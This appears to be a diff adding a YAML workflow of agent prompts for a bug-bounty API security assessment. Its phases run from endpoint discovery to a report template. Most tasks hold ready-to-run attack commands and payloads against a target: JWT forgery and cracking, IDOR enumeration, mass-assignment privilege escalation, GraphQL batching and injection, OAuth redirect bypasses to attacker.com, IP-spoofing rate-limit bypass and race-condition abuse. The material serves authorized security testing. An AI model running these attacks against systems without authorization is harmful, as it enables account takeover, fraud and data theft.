@@ -1,0 +1,668 @@
+name: "API Security Hunting"
+description: >
+  Deep API security assessment: endpoint discovery, authentication mapping,
+  IDOR/mass-assignment/JWT/GraphQL/OAuth attacks, race conditions, and
+  business-logic flaws. Structured as a progressive DAG so each phase
+  builds on confirmed findings from the prior one.
+
+variables:
+  TARGET: ""                   # e.g. https://api.example.com  (required)
+  PROGRAM: ""                  # bug bounty program name       (required)
+  API_BASE_URL: "${TARGET}/api"
+  OUTPUT_DIR: "./api-hunt-output"
+  WORDLIST_PATH: "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
+
+phases:
+
+  # ─────────────────────────────────────────────────────────────────────
+  - name: "Phase 1 — Asset Discovery"
+  # ─────────────────────────────────────────────────────────────────────
+    tasks:
+
+      - name: js-endpoint-extraction
+        prompt: |
+          You are hunting for hidden API endpoints for the ${PROGRAM} bug bounty program.
+          Target: ${TARGET}
+
+          Step 1 — Crawl and collect JS files:
+            katana -u ${TARGET} -d 5 -jc -kf all -o ${OUTPUT_DIR}/katana-urls.txt
+            waybackurls ${TARGET} | grep "\.js" | sort -u > ${OUTPUT_DIR}/js-urls.txt
+            gau --subs ${TARGET} | grep "\.js" | sort -u >> ${OUTPUT_DIR}/js-urls.txt
+            cat ${OUTPUT_DIR}/js-urls.txt | sort -u > ${OUTPUT_DIR}/js-unique.txt
+
+          Step 2 — Extract endpoints from JS:
+            cat ${OUTPUT_DIR}/js-unique.txt | while read url; do
+              curl -sk "$url" | grep -oE '(["'"'"'`])(\/[a-zA-Z0-9_\-/{}:?=&]+)(["'"'"'`])' | tr -d '"'"'"'`' >> ${OUTPUT_DIR}/js-endpoints-raw.txt
+            done
+            cat ${OUTPUT_DIR}/js-endpoints-raw.txt | sort -u > ${OUTPUT_DIR}/js-endpoints.txt
+
+          Step 3 — Look for hardcoded secrets in JS:
+            cat ${OUTPUT_DIR}/js-unique.txt | while read url; do
+              curl -sk "$url" | grep -iE '(api[_-]?key|secret|token|password|auth|bearer|aws_|AKIA)[[:space:]]*[:=][[:space:]]*["\'"'"'][^"'"'"']{8,}["\'"'"']' >> ${OUTPUT_DIR}/js-secrets.txt
+            done
+
+          Step 4 — Collect all unique parameter names:
+            cat ${OUTPUT_DIR}/katana-urls.txt | unfurl keys | sort -u > ${OUTPUT_DIR}/param-names.txt
+
+          Save all findings to ${OUTPUT_DIR}/ and summarise:
+          - Total JS files found
+          - Total unique endpoints extracted
+          - Any hardcoded secrets or API keys
+          - Top 20 most interesting endpoints
+
+      - name: swagger-openapi-discovery
+        prompt: |
+          Discover API documentation endpoints for ${PROGRAM} at ${TARGET}.
+
+          Probe each of these common paths (use ffuf or curl in parallel):
+            /swagger.json  /swagger.yaml  /swagger-ui.html  /swagger-ui/
+            /openapi.json  /openapi.yaml  /openapi/
+            /api-docs  /api-docs.json  /api/docs  /api/v1/docs  /api/v2/docs  /api/v3/docs
+            /v1  /v1/  /v2  /v3  /v4
+            /graphql  /playground  /altair  /voyager
+            /.well-known/openapi  /redoc  /rapidoc
+            /docs  /docs/  /documentation  /developer
+            /api/swagger  /api/openapi  /api/schema
+
+          Run with ffuf:
+            ffuf -u ${TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/swagger-wordlist.txt \
+              -mc 200,201,301,302,401,403 -o ${OUTPUT_DIR}/swagger-ffuf.json -of json \
+              -H "Accept: application/json" -t 40 -rate 50
+
+          For each discovered spec file:
+          1. Download and parse it
+          2. List all endpoints, methods, and parameter names
+          3. Identify any endpoints marked as deprecated or internal
+          4. Note authentication requirements per endpoint
+          5. Extract all server URLs defined in the spec
+
+          Save parsed endpoint list to ${OUTPUT_DIR}/openapi-endpoints.txt
+          Report all discovered documentation URLs and total endpoint count.
+
+      - name: graphql-discovery
+        prompt: |
+          Discover and fingerprint GraphQL endpoints for ${PROGRAM} at ${TARGET}.
+
+          Step 1 — Find GraphQL endpoints:
+            Probe: /graphql  /gql  /graphiql  /graphql/console  /api/graphql
+                   /v1/graphql  /v2/graphql  /query  /api/query
+                   /graphql/v1  /graphql/v2  /internal/graphql  /admin/graphql
+
+            ffuf -u ${TARGET}/FUZZ -w ${OUTPUT_DIR}/graphql-paths.txt \
+              -mc 200,400,401,403,405 -H "Content-Type: application/json" \
+              -d '{"query":"{__typename}"}' -X POST -t 20
+
+          Step 2 — Confirm with a POST introspection probe:
+            curl -sk -X POST ${TARGET}/graphql \
+              -H "Content-Type: application/json" \
+              -d '{"query":"{ __schema { queryType { name } } }"}' | python3 -m json.tool
+
+          Step 3 — Run full introspection (if allowed):
+            graphql-cop -t ${TARGET}/graphql -o ${OUTPUT_DIR}/graphql-cop.json
+            OR use the InQL Burp plugin equivalent via curl:
+            curl -sk -X POST ${TARGET}/graphql \
+              -H "Content-Type: application/json" \
+              -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } } }"}' \
+              > ${OUTPUT_DIR}/graphql-schema.json
+
+          Step 4 — Check for dangerous features:
+            - Introspection enabled (security risk)
+            - Field suggestions enabled (leaks schema)
+            - Batch query support (DoS risk)
+            - Mutations that modify data
+            - Subscriptions endpoints
+
+          Save all GraphQL findings to ${OUTPUT_DIR}/graphql-findings.txt.
+          Report endpoint URLs found, whether introspection is enabled, and list of mutations.
+
+  # ─────────────────────────────────────────────────────────────────────
+  - name: "Phase 2 — API Recon"
+  # ─────────────────────────────────────────────────────────────────────
+    tasks:
+
+      - name: api-authentication-mapping
+        depends_on: [js-endpoint-extraction, swagger-openapi-discovery, graphql-discovery]
+        prompt: |
+          Map all authentication mechanisms used by ${PROGRAM}'s API at ${TARGET}.
+
+          Step 1 — Capture baseline requests to key endpoints:
+            cat ${OUTPUT_DIR}/js-endpoints.txt ${OUTPUT_DIR}/openapi-endpoints.txt 2>/dev/null | \
+              sort -u | head -50 > ${OUTPUT_DIR}/top-endpoints.txt
+
+            httpx -l ${OUTPUT_DIR}/top-endpoints.txt -mc 200,401,403 \
+              -H "Authorization: Bearer INVALID_TOKEN" \
+              -store-response -store-response-dir ${OUTPUT_DIR}/auth-responses/ \
+              -status-code -title -tech-detect -o ${OUTPUT_DIR}/auth-probe.txt
+
+          Step 2 — Identify auth type from responses and request headers:
+            - Bearer JWT: look for Authorization: Bearer eyJ... headers
+            - OAuth: look for /oauth/token, /auth/callback, scope parameters
+            - API Key: look for X-API-Key, api_key query param, X-Auth-Token headers
+            - Session Cookie: look for Set-Cookie with session/csrftoken values
+            - Basic Auth: look for WWW-Authenticate: Basic in 401 responses
+
+          Step 3 — JWT analysis (if JWTs present):
+            - Collect sample JWT from a logged-in session
+            - Decode header and payload: echo "JWT_HERE" | cut -d. -f1 | base64 -d | python3 -m json.tool
+            - Note: algorithm (alg), key ID (kid), expiration (exp), issuer (iss)
+            - Check for sensitive data in payload (PII, roles, permissions)
+
+          Step 4 — OAuth endpoint mapping:
+            curl -sk ${TARGET}/.well-known/openid-configuration | python3 -m json.tool
+            curl -sk ${TARGET}/.well-known/oauth-authorization-server | python3 -m json.tool
+            Note: authorization_endpoint, token_endpoint, userinfo_endpoint, scopes_supported
+
+          Document all findings in ${OUTPUT_DIR}/auth-map.md with a table:
+          | Endpoint Pattern | Auth Type | Auth Header/Param | Notes |
+
+      - name: api-versioning-analysis
+        depends_on: [js-endpoint-extraction, swagger-openapi-discovery]
+        prompt: |
+          Analyse API versioning and find deprecated/unprotected old versions for ${PROGRAM} at ${TARGET}.
+
+          Step 1 — Enumerate version prefixes:
+            VERSIONS="v0 v1 v2 v3 v4 v5 v0.1 v1.0 v1.1 v2.0 beta alpha"
+            for v in $VERSIONS; do
+              httpx -u "${TARGET}/api/${v}/users" -mc 200,401,403 -silent
+              httpx -u "${TARGET}/${v}/users" -mc 200,401,403 -silent
+            done > ${OUTPUT_DIR}/version-probe.txt
+
+          Step 2 — Compare behaviour across versions:
+            - Does v1 require auth where v2 does not?
+            - Are there extra fields exposed in older versions?
+            - Do older versions lack rate limiting?
+            - Are there CORS differences between versions?
+
+          Step 3 — Check for shadow/internal APIs:
+            Probe: /internal/api/ /private/api/ /admin/api/ /backend/api/
+                   /api/internal/ /api/private/ /api/admin/ /api/debug/
+            httpx -l ${OUTPUT_DIR}/version-probe.txt -fc 404 -silent -o ${OUTPUT_DIR}/live-versions.txt
+
+          Step 4 — Changelog/diff analysis:
+            - If API spec is available: compare endpoint lists across versions
+            - Look for endpoints removed in newer versions but still live in old
+            - Document any endpoints with weaker security in older versions
+
+          Save findings to ${OUTPUT_DIR}/versioning-report.txt.
+          Highlight any older versions that appear to have weaker or missing authentication.
+
+      - name: api-parameter-discovery
+        depends_on: [js-endpoint-extraction, swagger-openapi-discovery]
+        prompt: |
+          Discover hidden and undocumented parameters for ${PROGRAM}'s API at ${TARGET}.
+
+          Step 1 — Parameter name collection:
+            # Combine wordlists
+            cat /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+                /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
+                ${OUTPUT_DIR}/param-names.txt 2>/dev/null | sort -u > ${OUTPUT_DIR}/param-wordlist.txt
+
+          Step 2 — Run Arjun for hidden parameter discovery on top endpoints:
+            head -20 ${OUTPUT_DIR}/top-endpoints.txt | while read endpoint; do
+              arjun -u "${TARGET}${endpoint}" -m GET,POST -o ${OUTPUT_DIR}/arjun-${endpoint//\//-}.json \
+                -t 10 -d 2 --stable 2>/dev/null || true
+            done
+
+          Step 3 — ffuf parameter fuzzing on interesting endpoints:
+            # GET parameters
+            ffuf -u "${TARGET}/api/users?FUZZ=1" -w ${OUTPUT_DIR}/param-wordlist.txt \
+              -mc 200,500 -fs 0 -of json -o ${OUTPUT_DIR}/get-params.json -t 30 -rate 50
+
+            # POST body parameters
+            ffuf -u "${TARGET}/api/users" -w ${OUTPUT_DIR}/param-wordlist.txt \
+              -X POST -H "Content-Type: application/json" \
+              -d '{"FUZZ": "test"}' -mc 200,400,500 -fs 0 \
+              -of json -o ${OUTPUT_DIR}/post-params.json -t 30
+
+          Step 4 — Identify debug/admin parameters:
+            Look for: debug=true, test=1, admin=true, internal=1, preview=true,
+                      verbose=1, format=debug, X-Debug-Mode, X-Internal-Request
+
+          Save all discovered hidden parameters to ${OUTPUT_DIR}/hidden-params.txt.
+          Mark which ones produce different responses with special values.
+
+  # ─────────────────────────────────────────────────────────────────────
+  - name: "Phase 3 — Vulnerability Testing"
+  # ─────────────────────────────────────────────────────────────────────
+    tasks:
+
+      - name: idor-testing
+        depends_on: [api-authentication-mapping, api-versioning-analysis, api-parameter-discovery]
+        prompt: |
+          Systematically test for Insecure Direct Object References (IDOR) in ${PROGRAM}'s API at ${TARGET}.
+
+          Step 1 — Identify object reference endpoints:
+            grep -E '(\{id\}|/[0-9]+$|/[0-9]+/|uuid|guid|/me/|/account/)' \
+              ${OUTPUT_DIR}/openapi-endpoints.txt ${OUTPUT_DIR}/js-endpoints.txt 2>/dev/null | \
+              sort -u > ${OUTPUT_DIR}/idor-candidates.txt
+
+          Step 2 — Horizontal IDOR (same privilege, different user):
+            With account A: note your user ID (e.g. 1234), capture resource IDs from your profile/orders/etc.
+            With account B (or without auth): attempt to access:
+              GET ${TARGET}/api/users/1233  (your ID - 1)
+              GET ${TARGET}/api/users/1235  (your ID + 1)
+              GET ${TARGET}/api/orders/YOUR_ORDER_ID (as different user)
+              GET ${TARGET}/api/documents/YOUR_DOC_ID (as different user)
+            Note: HTTP status codes, response size differences, actual data returned
+
+          Step 3 — Vertical IDOR (privilege escalation):
+            As a regular user, access admin endpoints:
+              GET ${TARGET}/api/admin/users
+              GET ${TARGET}/api/admin/config
+              PUT ${TARGET}/api/users/VICTIM_ID (modify another user's data)
+              DELETE ${TARGET}/api/users/VICTIM_ID
+
+          Step 4 — UUID/GUID-based IDORs:
+            If UUIDs are used, check if they are predictable (UUIDv1 uses timestamp+MAC):
+              python3 -c "import uuid; [print(uuid.uuid1()) for _ in range(5)]"
+            Test: enumerate sequential IDs even behind UUIDs by capturing multiple resource IDs
+            and checking for UUID collision via timing attacks.
+
+          Step 5 — Indirect IDOR (via parameters):
+            Test: ?user_id=VICTIM_ID, ?account=VICTIM_ACCOUNT, ?email=victim@example.com
+            Check JSON POST body: {"userId": VICTIM_ID, "target_user": VICTIM_EMAIL}
+
+          Document all confirmed IDORs with:
+          - Endpoint and method
+          - Parameter changed
+          - Expected vs actual access
+          - Data exposed or modified
+          Save to ${OUTPUT_DIR}/idor-findings.txt
+
+      - name: mass-assignment
+        depends_on: [api-authentication-mapping, api-parameter-discovery]
+        prompt: |
+          Test for mass assignment vulnerabilities in ${PROGRAM}'s API at ${TARGET}.
+
+          Mass assignment occurs when an API binds user-supplied fields directly to a model,
+          allowing attackers to set fields that should not be user-writable.
+
+          Step 1 — Identify create/update endpoints:
+            grep -E '(POST|PUT|PATCH)' ${OUTPUT_DIR}/openapi-endpoints.txt 2>/dev/null || \
+            grep -E '(/create|/update|/register|/profile|/settings|/account)' \
+              ${OUTPUT_DIR}/js-endpoints.txt | sort -u > ${OUTPUT_DIR}/mutation-endpoints.txt
+
+          Step 2 — Test privilege escalation via mass assignment:
+            # For registration/profile update endpoints, add privileged fields:
+            curl -sk -X POST ${TARGET}/api/register \
+              -H "Content-Type: application/json" \
+              -d '{"email":"test@test.com","password":"Test1234!","role":"admin","isAdmin":true,"is_staff":true,"subscription":"premium","credits":99999,"verified":true}'
+
+            # For profile update:
+            curl -sk -X PUT ${TARGET}/api/profile \
+              -H "Authorization: Bearer YOUR_TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{"name":"test","role":"admin","admin":true,"is_superuser":true,"balance":99999,"plan":"enterprise"}'
+
+          Step 3 — Check for nested object injection:
+            curl -sk -X PUT ${TARGET}/api/profile \
+              -H "Content-Type: application/json" \
+              -d '{"user":{"role":"admin"},"permissions":["read","write","admin"],"acl":{"admin":true}}'
+
+          Step 4 — Test common privileged fields:
+            role, roles, group, groups, admin, is_admin, isAdmin, administrator,
+            is_staff, superuser, is_superuser, verified, is_verified, active,
+            balance, credits, subscription, plan, tier, quota, limit, rate_limit,
+            permissions, scopes, access_level, privilege_level
+
+          Step 5 — Verify exploitation by re-fetching user profile:
+            curl -sk ${TARGET}/api/profile -H "Authorization: Bearer YOUR_TOKEN" | python3 -m json.tool
+
+          Report all fields that were successfully set and their security impact.
+          Save to ${OUTPUT_DIR}/mass-assignment-findings.txt
+
+      - name: jwt-attacks
+        depends_on: [api-authentication-mapping]
+        prompt: |
+          Test JWT authentication weaknesses for ${PROGRAM} at ${TARGET}.
+
+          Prerequisite: Obtain a valid JWT from a test account login flow.
+          JWT format: base64(header).base64(payload).signature
+
+          Step 1 — Decode and analyse the JWT:
+            JWT="YOUR_TOKEN_HERE"  # Replace with actual token
+            echo $JWT | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
+            echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+
+          Step 2 — Algorithm confusion attack (alg:none):
+            # Create a new JWT with alg:none and no signature
+            python3 -c "
+            import base64, json
+            header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
+            payload = base64.b64encode(json.dumps({'sub':'admin','role':'admin','iat':9999999999}).encode()).decode().rstrip('=')
+            print(f'{header}.{payload}.')
+            "
+            # Test the crafted token against the API
+
+          Step 3 — HS256/RS256 algorithm confusion:
+            # If the server signs with RS256 but also accepts HS256,
+            # sign the token with the public key as HMAC secret:
+            # python-jwt or PyJWT can be used for this
+
+          Step 4 — Weak secret brute force:
+            hashcat -a 0 -m 16500 ${JWT} /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+            hashcat -a 0 -m 16500 ${JWT} /usr/share/wordlists/rockyou.txt
+            # Also try: jwt-cracker, john the ripper with jwt2john
+
+          Step 5 — Other JWT attacks:
+            - Expired token acceptance: modify exp claim to past value, test if still accepted
+            - Kid header injection: try "kid": "../../dev/null", "kid": "0 UNION SELECT 'secret'"
+            - jwk header injection: embed your own public key in the jwk header
+            - JWT without signature: accept token with empty signature?
+
+          Step 6 — Token storage analysis:
+            - Is JWT stored in localStorage? (XSS-stealable)
+            - Is JWT in cookie? Check HttpOnly, Secure, SameSite flags
+            - What is the token expiry? Is refresh implemented securely?
+
+          Document all JWT vulnerabilities with PoC tokens.
+          Save to ${OUTPUT_DIR}/jwt-findings.txt
+
+      - name: graphql-introspection-attacks
+        depends_on: [graphql-discovery, api-authentication-mapping]
+        prompt: |
+          Test GraphQL endpoints for security vulnerabilities in ${PROGRAM} at ${TARGET}.
+
+          Reference findings from ${OUTPUT_DIR}/graphql-findings.txt for endpoint locations.
+
+          Step 1 — Introspection abuse (if enabled):
+            curl -sk -X POST GRAPHQL_ENDPOINT \
+              -H "Content-Type: application/json" \
+              -d '{"query":"{ __schema { types { name kind fields { name args { name type { name kind ofType { name } } } type { name kind } } } } }"}' \
+              | python3 -c "import sys,json; schema=json.load(sys.stdin); [print(t['name'], [f['name'] for f in (t.get('fields') or [])]) for t in schema['data']['__schema']['types'] if t['kind']=='OBJECT']"
+
+          Step 2 — BOLA/IDOR in GraphQL:
+            # Test fetching other users' data via queries:
+            curl -sk -X POST GRAPHQL_ENDPOINT \
+              -H "Content-Type: application/json" \
+              -d '{"query":"{ user(id: \"VICTIM_ID\") { email phone address creditCards { number } } }"}'
+
+            # Enumerate IDs:
+            for i in $(seq 1 100); do
+              curl -sk -X POST GRAPHQL_ENDPOINT \
+                -H "Content-Type: application/json" \
+                -d "{\"query\":\"{ user(id: \\\"$i\\\") { id email } }\"}" | grep -v "null"
+            done
+
+          Step 3 — GraphQL batching attack (DoS / rate-limit bypass):
+            # Send 100 operations in one request (bypasses per-request rate limiting):
+            python3 -c "
+            queries = [{'query': 'mutation { login(email: \"test@test.com\", password: \"' + str(i) + '\") { token } }'} for i in range(100)]
+            import json; print(json.dumps(queries))
+            " > /tmp/batch.json
+            curl -sk -X POST GRAPHQL_ENDPOINT -H "Content-Type: application/json" -d @/tmp/batch.json
+
+          Step 4 — Field suggestions (schema leakage without introspection):
+            curl -sk -X POST GRAPHQL_ENDPOINT \
+              -H "Content-Type: application/json" \
+              -d '{"query":"{ usr { id } }"}' | grep "Did you mean"
+
+          Step 5 — GraphQL injection:
+            # Try injecting into string arguments:
+            curl -sk -X POST GRAPHQL_ENDPOINT \
+              -H "Content-Type: application/json" \
+              -d '{"query":"{ users(filter: \"\\\" OR 1=1 OR \\\"\") { id email } }"}'
+
+          Save all GraphQL findings to ${OUTPUT_DIR}/graphql-vuln-findings.txt.
+
+      - name: oauth-flow-attacks
+        depends_on: [api-authentication-mapping]
+        prompt: |
+          Test OAuth 2.0 / OpenID Connect flows for vulnerabilities in ${PROGRAM} at ${TARGET}.
+
+          Step 1 — Map the OAuth flow:
+            curl -sk ${TARGET}/.well-known/openid-configuration > ${OUTPUT_DIR}/oidc-config.json
+            cat ${OUTPUT_DIR}/oidc-config.json | python3 -m json.tool
+            Note: authorization_endpoint, token_endpoint, userinfo_endpoint
+
+          Step 2 — State parameter CSRF:
+            Initiate OAuth flow WITHOUT state parameter:
+              ${TARGET}/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI
+            Initiate flow WITH a static/predictable state:
+              ...&state=12345 (static) or &state=abc (guessable)
+            Impact: CSRF allows attacker to link victim's account to attacker's OAuth
+
+          Step 3 — redirect_uri bypass:
+            # Try open redirect via parameter manipulation:
+            - Add extra path: &redirect_uri=https://legitimate.com/callback/../../../attacker.com
+            - Add query param: &redirect_uri=https://legitimate.com/callback?next=https://attacker.com
+            - Try subdomains: &redirect_uri=https://evil.legitimate.com/callback
+            - Try fragments: &redirect_uri=https://legitimate.com/callback#https://attacker.com
+            - Null byte: &redirect_uri=https://legitimate.com/callback%00.attacker.com
+
+          Step 4 — Token leakage via referrer:
+            # If implicit flow is used (response_type=token), the access token
+            # appears in the URL fragment. Check if the callback page loads any
+            # third-party scripts that could capture the Referer header.
+
+          Step 5 — PKCE downgrade (if applicable):
+            # Try removing code_challenge parameter and exchanging code without verifier
+            # Check if server enforces PKCE for public clients
+
+          Step 6 — Token endpoint attacks:
+            # Try client credential stuffing
+            # Test if refresh tokens can be reused after revocation
+            # Check scope parameter manipulation: request wider scopes than intended
+
+          Document the complete OAuth flow and all vulnerabilities found.
+          Save to ${OUTPUT_DIR}/oauth-findings.txt
+
+  # ─────────────────────────────────────────────────────────────────────
+  - name: "Phase 4 — Advanced Testing"
+  # ─────────────────────────────────────────────────────────────────────
+    tasks:
+
+      - name: rate-limiting-bypass
+        depends_on: [idor-testing, jwt-attacks, oauth-flow-attacks]
+        prompt: |
+          Test rate limiting and its bypass techniques for ${PROGRAM} at ${TARGET}.
+
+          Step 1 — Baseline rate limit measurement:
+            # Measure when 429 appears on login:
+            for i in $(seq 1 20); do
+              curl -sk -o /dev/null -w "%{http_code}\n" -X POST ${TARGET}/api/auth/login \
+                -H "Content-Type: application/json" \
+                -d '{"email":"test@test.com","password":"wrong'$i'"}'
+            done
+
+          Step 2 — IP rotation bypass:
+            # Add IP spoofing headers:
+            for i in $(seq 1 50); do
+              curl -sk -X POST ${TARGET}/api/auth/login \
+                -H "X-Forwarded-For: 10.0.0.${i}" \
+                -H "X-Real-IP: 10.0.0.${i}" \
+                -H "X-Originating-IP: 10.0.0.${i}" \
+                -H "Content-Type: application/json" \
+                -d '{"email":"victim@test.com","password":"attempt'$i'"}'
+            done
+
+          Step 3 — User-Agent rotation:
+            # Rate limiting based on UA string:
+            USER_AGENTS=("Mozilla/5.0" "curl/7.80" "Python/3.9" "Go-http-client/1.1")
+            for ua in "${USER_AGENTS[@]}"; do
+              curl -sk -X POST ${TARGET}/api/auth/login \
+                -H "User-Agent: $ua" -d '{"email":"test@test.com","password":"wrong"}'
+            done
+
+          Step 4 — Account enumeration via rate-limit timing:
+            # Even with rate limiting, timing differences in "user not found" vs "wrong password"
+            # can reveal valid accounts:
+            time curl -sk -X POST ${TARGET}/api/auth/login \
+              -d '{"email":"definitelynotauser@example.com","password":"test"}'
+            time curl -sk -X POST ${TARGET}/api/auth/login \
+              -d '{"email":"admin@${TARGET}","password":"test"}'
+
+          Step 5 — Endpoint aliasing:
+            # Does rate limiting apply separately per path?
+            # If /api/v1/login is rate limited, try /api/v2/login, /login, /auth/login
+            httpx -l ${OUTPUT_DIR}/live-versions.txt -path /auth/login -mc 200,401,403
+
+          Step 6 — GraphQL rate limit bypass via batching:
+            See graphql-introspection-attacks results.
+            Report impact: credential stuffing, account enumeration, 2FA brute force enablement.
+            Save to ${OUTPUT_DIR}/rate-limit-findings.txt
+
+      - name: race-condition-testing
+        depends_on: [idor-testing, mass-assignment]
+        prompt: |
+          Test for race condition vulnerabilities in ${PROGRAM}'s API at ${TARGET}.
+
+          Race conditions occur when multiple concurrent requests interact with shared state
+          before integrity checks complete (TOCTOU — time of check to time of use).
+
+          Step 1 — Identify race-prone endpoints:
+            High-value targets:
+            - Coupon/promo code redemption: POST /api/coupons/redeem
+            - Fund transfer / withdrawal: POST /api/transfer, POST /api/withdraw
+            - Limited item purchase: POST /api/checkout, POST /api/orders
+            - Vote / like / follow: POST /api/vote, POST /api/like (prevent double-vote)
+            - Account credit application: POST /api/credits/apply
+            - Password reset (single-use token): POST /api/auth/reset-password
+
+          Step 2 — Send simultaneous requests using Turbo Intruder-style parallel sending:
+            # Using GNU parallel:
+            # Note the endpoint and adjust the body for your target
+            ENDPOINT="${TARGET}/api/coupons/redeem"
+            TOKEN="YOUR_AUTH_TOKEN"
+            BODY='{"coupon_code":"SAVE10"}'
+
+            # Send 20 simultaneous requests:
+            seq 20 | parallel -j20 curl -sk -X POST $ENDPOINT \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Content-Type: application/json" \
+              -d "$BODY" -w "\n%{http_code}\n"
+
+          Step 3 — Race condition on balance/credits:
+            # Fund transfer race: try to spend the same balance twice
+            seq 10 | parallel -j10 curl -sk -X POST ${TARGET}/api/transfer \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{"to":"attacker@test.com","amount":100}' -w "\n%{http_code}\n"
+
+          Step 4 — One-time token race condition:
+            # Use the same password reset token multiple times simultaneously:
+            seq 5 | parallel -j5 curl -sk -X POST ${TARGET}/api/auth/reset-password \
+              -H "Content-Type: application/json" \
+              -d '{"token":"RESET_TOKEN","password":"NewPassword1!"}' -w "\n%{http_code}\n"
+
+          Step 5 — Analyse results:
+            - Multiple 200 responses to a should-be-once action = race condition confirmed
+            - Check account balance/state after the race to confirm exploitation
+            - Note the window size and required concurrency level
+
+          Document with curl commands, parallel request count, and proof of double-execution.
+          Save to ${OUTPUT_DIR}/race-condition-findings.txt
+
+      - name: business-logic-flaws
+        depends_on: [mass-assignment, idor-testing, rate-limiting-bypass]
+        prompt: |
+          Test for business logic vulnerabilities in ${PROGRAM}'s application at ${TARGET}.
+
+          Business logic flaws bypass intended application workflows rather than
+          exploiting technical implementation bugs.
+
+          Step 1 — Negative price / integer overflow:
+            # Can you purchase with a negative price?
+            curl -sk -X POST ${TARGET}/api/cart/add \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{"product_id":"PROD1","quantity":-1,"price":-99.99}'
+
+            # Integer overflow: maximum int values
+            curl -sk -X POST ${TARGET}/api/cart/add \
+              -d '{"quantity":9999999999999,"discount_percent":999}'
+
+          Step 2 — Workflow bypass / step skipping:
+            # Can you go directly to checkout without filling the cart?
+            # Can you skip email verification?
+            # Can you skip payment and jump to order confirmation?
+            # POST to step 3 of a multi-step process without completing steps 1-2
+            curl -sk -X POST ${TARGET}/api/checkout/confirm \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{"order_id":"NEW","payment_confirmed":true}'
+
+          Step 3 — Privilege escalation chains:
+            # Can a free user access premium features?
+            curl -sk ${TARGET}/api/premium/reports -H "Authorization: Bearer FREE_USER_TOKEN"
+
+            # Can a regular user access admin panel?
+            curl -sk ${TARGET}/api/admin/dashboard -H "Authorization: Bearer REGULAR_TOKEN"
+
+            # Does deleting your account before a refund process both actions?
+
+          Step 4 — Coupon and discount abuse:
+            # Stack multiple coupons:
+            curl -sk -X POST ${TARGET}/api/checkout \
+              -d '{"coupons":["SAVE10","SAVE20","SAVE30"],"items":[...]}'
+
+            # Apply coupon after checkout (price re-calculation):
+            # First checkout, then try applying coupon to completed order
+
+          Step 5 — Account / email manipulation:
+            # Change email to another user's email (case variations): admin@SITE.com vs Admin@site.com
+            curl -sk -X PUT ${TARGET}/api/profile \
+              -d '{"email":"Admin@${TARGET}"}'
+
+            # Unicode normalization: café vs cafe
+            # Add trailing dots or plus aliases: user+admin@example.com
+
+          Report all business logic flaws with exact reproduction steps.
+          Save to ${OUTPUT_DIR}/business-logic-findings.txt
+
+  # ─────────────────────────────────────────────────────────────────────
+  - name: "Phase 5 — Report"
+  # ─────────────────────────────────────────────────────────────────────
+    tasks:
+
+      - name: api-findings-report
+        depends_on: [rate-limiting-bypass, race-condition-testing, business-logic-flaws]
+        prompt: |
+          Compile a professional bug bounty report for ${PROGRAM}'s API security assessment.
+
+          Consolidate all findings from:
+            ${OUTPUT_DIR}/idor-findings.txt
+            ${OUTPUT_DIR}/mass-assignment-findings.txt
+            ${OUTPUT_DIR}/jwt-findings.txt
+            ${OUTPUT_DIR}/graphql-vuln-findings.txt
+            ${OUTPUT_DIR}/oauth-findings.txt
+            ${OUTPUT_DIR}/rate-limit-findings.txt
+            ${OUTPUT_DIR}/race-condition-findings.txt
+            ${OUTPUT_DIR}/business-logic-findings.txt
+
+          For each confirmed vulnerability, produce a HackerOne-style report section:
+
+          ---
+          ## [CRITICAL/HIGH/MEDIUM/LOW] Vulnerability Title
+
+          **CVSS Score:** X.X (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
+          **CWE:** CWE-XXX
+
+          ### Description
+          [Clear explanation of the vulnerability]
+
+          ### Steps to Reproduce
+          1. Step 1
+          2. Step 2
+          3. ...
+
+          ### Impact
+          [Business impact: data breach, account takeover, financial loss, etc.]
+
+          ### Proof of Concept
+          ```
+          curl command or code snippet
+          ```
+
+          ### Remediation
+          [Specific fix recommendation]
+          ---
+
+          Priority order for reporting:
+          1. CRITICAL: Account takeover, RCE, mass data breach
+          2. HIGH: Privilege escalation, mass IDOR, payment bypass
+          3. MEDIUM: Limited IDOR, rate limit bypass, JWT weakness
+          4. LOW/INFO: Missing headers, verbose errors, info disclosure
+
+          Save the complete report to ${OUTPUT_DIR}/REPORT-${PROGRAM}-API-Security.md
+          Also create ${OUTPUT_DIR}/REPORT-SUMMARY.txt with a one-line summary per finding.
